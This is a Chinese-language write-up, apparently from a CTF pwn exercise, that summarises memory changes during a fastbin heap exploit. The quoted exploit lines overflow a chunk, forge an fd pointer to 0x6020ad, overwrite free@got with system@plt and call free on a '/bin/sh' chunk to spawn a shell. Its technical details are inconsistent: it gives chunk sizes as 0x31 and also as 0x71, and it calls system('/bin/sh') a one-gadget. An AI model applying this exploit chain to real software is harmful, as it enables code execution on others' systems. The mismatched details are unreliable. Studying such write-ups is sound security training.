## 内存变化总结

基于上述调试对话，内存状态经历了以下关键变化：

### 1. 初始堆状态
- **堆布局**：多个大小为0x31（49字节）的fastbin块，对应用户请求的0x68大小chunk
- **bins状态**：所有bins为空，表明没有空闲块
- **进程状态**：程序已成功获得shell（/bin/dash）

### 2. Exp执行过程中的关键内存变化

#### 堆块创建阶段
```python
add(0x68,b'6');add(0x68,b'6');add(0x68,b'6')
```
- 创建了3个大小为0x68的用户堆块
- 对应chunk大小为0x71（包含元数据）
- heaparray数组填充了这3个堆块的指针

#### 堆块释放阶段
```python
free(2)
```
- 释放索引2的堆块，进入fastbin
- 该块的fd指针指向fastbin链表头部（或为NULL）

#### 堆溢出攻击阶段
```python
edit(1,b'/bin/sh\x00'+b'\x00'*0x60+p64(0x71)+p64(0x6020ad))
```
- **关键变化**：通过编辑chunk1溢出覆盖chunk2的元数据
  - 在chunk1用户数据区写入"/bin/sh\x00"字符串
  - 填充0x60字节到chunk边界
  - **覆盖chunk2的size字段为0x71**
  - **覆盖chunk2的fd指针为0x6020ad**（伪造地址）

#### 伪造块分配阶段
```python
add(0x68,b'6');add(0x68,b'6')
```
- 第一次分配：从fastbin取出原chunk2
- 第二次分配：**关键变化** - 从伪造地址0x6020ad分配"chunk"
  - 获得指向GOT表附近内存的控制权

#### GOT表覆盖阶段
```python
edit(3,b'\x00'*0x23+p64(elf.got['free']))
edit(0,p64(elf.plt['system']))
```
- **关键变化**：
  - 编辑伪造块，在偏移0x23处写入free的GOT地址
  - 编辑chunk0，将free的GOT条目覆盖为system的PLT地址

#### 触发利用阶段
```python
free(1)
```
- **关键变化**：实际执行`system("/bin/sh")`而非`free()`
- 由于GOT表被覆盖，free调用被重定向到system
- chunk1中的"/bin/sh"字符串作为参数

### 3. 最终内存状态

#### 堆内存
- 多个活跃的堆块，大小主要为0x31（对应用户0x68）
- 所有bins为空，表明堆管理正常
- 堆布局包含利用过程中创建的所有块

#### 进程内存
- **程序替换**：原始程序被/bin/dash替换
- **GOT表修改**：free@got指向system@plt
- **关键数据**：chunk1包含"/bin/sh"字符串
- **堆指针**：heaparray包含指向有效堆块的指针

#### 利用成功标志
- 进程状态显示运行/bin/sh
- 寄存器状态正常，处于read系统调用等待输入
- 堆栈包含dash shell的函数调用链

### 4. 漏洞利用技术总结

1. **UAF + 堆溢出**：通过编辑已释放块的相邻块实现溢出
2. **Fastbin Attack**：利用fastbin的单向链表特性进行攻击
3. **GOT Hijacking**：覆盖GOT表实现函数重定向
4. **One-gadget**：使用system("/bin/sh")作为利用目标

整个利用过程成功地将堆漏洞转化为代码执行，最终获得了shell权限。